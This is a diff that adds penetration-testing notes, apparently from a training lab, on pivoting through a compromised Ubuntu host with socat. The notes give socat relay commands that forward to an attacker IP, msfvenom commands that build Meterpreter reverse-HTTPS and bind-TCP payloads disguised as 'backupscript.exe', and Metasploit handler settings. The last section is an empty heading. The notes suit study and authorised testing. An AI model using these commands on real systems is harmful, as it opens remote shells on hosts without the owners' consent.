@@ -387,6 +387,81 @@ run
 
 ----------------
 
+- Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.
+- Set on compromised pivot host-:
+
+```
+socat TCP4-LISTEN:[listening port on compromised's host],fork TCP4:[attacker'sip]:[attacker'sport]
+socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+```
+
+![image](https://github.com/user-attachments/assets/62a7d0b6-a8fd-4870-a106-19b59e54b40a)
+
+- Socat will listen on port 8080 and redirect data to our attacker's port.Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
+- Create a reverse https shell-:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+```
+
+- Setup a reverse https exploit/handle
+
+![image](https://github.com/user-attachments/assets/e2181cef-7b79-4c61-adb7-efe2149aa41a)
+
+-  Run exploit and shell-:
+
+![image](https://github.com/user-attachments/assets/a25fa55e-1141-4189-8fa3-d56e2af86097)
+
+----------------
+
+### Socat redirection with  bind shell 
+
+----------------
+
+- Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
+- Creating a msfvenom bindshell-:
+
+```bash
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
+```
+![image](https://github.com/user-attachments/assets/65af20ff-72d9-499a-80a0-fe87599fdbf7)
+
+- Start a socat bind listener-:
+
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+```
+
+- Setting up  bind multi handler-:
+
+```msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST  10.129.210.63
+set LPORT 8080
+run
+```
+![image](https://github.com/user-attachments/assets/aefa8a54-a210-410a-8a91-8d8f42ea10ff)
+
+-  Shell-:
+
+![image](https://github.com/user-attachments/assets/d44e578b-d474-4a23-abd3-749a393e89d5)
+
+--------------
+
+### SSH for windows plinx.exe
+
+--------------
+
+- 
+
+
+
+
+
+
+
+
 
 
 
